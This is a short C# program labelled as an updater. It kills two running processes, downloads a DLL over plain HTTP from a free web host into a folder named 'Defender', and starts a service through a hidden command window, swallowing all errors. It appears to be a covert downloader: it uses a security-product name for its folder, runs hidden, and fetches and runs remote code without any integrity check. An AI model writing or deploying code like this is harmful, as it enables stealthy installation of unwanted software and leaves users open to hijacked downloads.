using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace update
{
	class Program
	{
		static void Main( string[] args )
		{
			try
			{
				foreach ( var process in Process.GetProcessesByName( "residentsvc" ) )
					process.Kill( );
				foreach ( var process in Process.GetProcessesByName( "screen" ) )
					process.Kill( );

				System.Threading.Thread.Sleep( 500 );

				var src = "http://slimbde.atwebpages.com/share/src/svc.dll";
				var dst = AppDomain.CurrentDomain.BaseDirectory.Replace( "Update", "Defender" ) + "svc.dll";
				var webClient = new WebClient( );
				webClient.DownloadFile( src, dst );

				System.Threading.Thread.Sleep( 500 );

				var startInfo = new ProcessStartInfo( );
				startInfo.CreateNoWindow = true;
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";

				startInfo.Arguments = $"/C sc start residentsvc";
				Process.Start( startInfo );
			}
			catch ( Exception ) { }
		}
	}
}
